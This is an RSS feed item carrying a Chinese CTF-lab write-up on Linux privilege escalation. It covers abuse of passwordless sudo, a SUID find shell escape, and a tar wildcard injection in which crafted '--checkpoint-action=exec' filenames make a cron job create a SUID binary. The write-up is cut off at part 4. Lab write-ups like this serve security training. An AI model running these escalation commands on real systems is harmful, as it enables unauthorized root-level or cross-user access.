<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>靶场笔记 on mrlxl的知识库</title>
    <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</link>
    <description>Recent content in 靶场笔记 on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>云尘靶场-Linux提权系列</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/</guid>
      <description>&lt;h1 id=&#34;云尘靶场-linux提权系列wp&#34;&gt;云尘靶场-Linux提权系列WP&lt;/h1&gt;&#xA;&lt;h3 id=&#34;linux提权系列-1&#34;&gt;Linux提权系列-1&lt;/h3&gt;&#xA;&lt;p&gt;ssh连接靶机，首先进行基本的信息收集：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725230324428-2064990369.png&#34; alt=&#34;image-20240725230323294&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现当前ctf用户可以免密sudo，以user1的身份执行&lt;code&gt;/bin/bash&lt;/code&gt;，很经典的sudo提权嘛，直接来：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo -u user1 /bin/bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725230638057-1412622423.png&#34; alt=&#34;image-20240725230637010&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;成功获取到user1的BashShell，看看当前目录有什么：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725231136018-463702219.png&#34; alt=&#34;屏幕截图 2024-07-25 230744&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功拿到了flag&lt;/p&gt;&#xA;&lt;h3 id=&#34;linux提权系列-2&#34;&gt;Linux提权系列-2&lt;/h3&gt;&#xA;&lt;p&gt;ssh连接靶机，首先进行基本的信息收集：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725232658972-332524861.png&#34; alt=&#34;image-20240725232657975&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现suid权限配置不当，find命令拥有了suid权限，看看find的所有者：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725233021715-969392630.png&#34; alt=&#34;image-20240725233020962&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所有者为user2，意味着可以提权到user2，那么直接用find提权：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find .profile -exec /bin/bash -p &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725232919178-1849059561.png&#34; alt=&#34;image-20240725232918526&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;轻松提权到user2&lt;/p&gt;&#xA;&lt;p&gt;进入&lt;code&gt;/home/user2&lt;/code&gt;看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725233306993-2035504490.png&#34; alt=&#34;屏幕截图 2024-07-25 233206&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功拿到flag&lt;/p&gt;&#xA;&lt;h3 id=&#34;linux提权系列-3&#34;&gt;Linux提权系列-3&lt;/h3&gt;&#xA;&lt;p&gt;在信息收集时发现存在user3用户的定时任务：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164121024-1657949.png&#34; alt=&#34;image-20240907164118931&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看看定时任务脚本内容：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164203932-109265356.png&#34; alt=&#34;image-20240907164202488&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里的tar命令使用了通配符，可以考虑通配符注入进行提权&lt;/p&gt;&#xA;&lt;p&gt;首先创建&lt;code&gt;/tmp/abcd/&lt;/code&gt;路径：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /tmp/abcd&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后创建利用文件和脚本，并赋予权限：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/bin/cp /usr/bin/find /tmp/myfind &amp;amp;&amp;amp; chmod 4777 /tmp/myfind&amp;#39;&lt;/span&gt; &amp;gt; exploit.sh &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;--checkpoint=1&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;--checkpoint-action=exec=sh exploit.sh&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod &lt;span class=&#34;m&#34;&gt;777&lt;/span&gt; /tmp/abcd/*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164838052-664999240.png&#34; alt=&#34;image-20240907164836357&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来等待定时任务执行时触发&lt;code&gt;*&lt;/code&gt;的通配符注入，得到所有者为user3，且具有suid权限的&lt;code&gt;/tmp/myfind&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907171919996-338103874.png&#34; alt=&#34;image-20240907171918344&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;得到后即可用find进行suid提权获得user3的shell&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907172037586-1283039712.png&#34; alt=&#34;image-20240907172036287&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;直接读flag即可：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907172148166-1703464176.png&#34; alt=&#34;屏幕截图 2024-09-07 172056&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;linux提权系列-4&#34;&gt;Linux提权系列-4&lt;/h3&gt;&#xA;&lt;p&gt;首先信息收集一波：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730003332676-276151568.png&#34; alt=&#34;image-20240730003331426&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现两个免密sudo的玩意，直接先获取一个user1的shell：&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
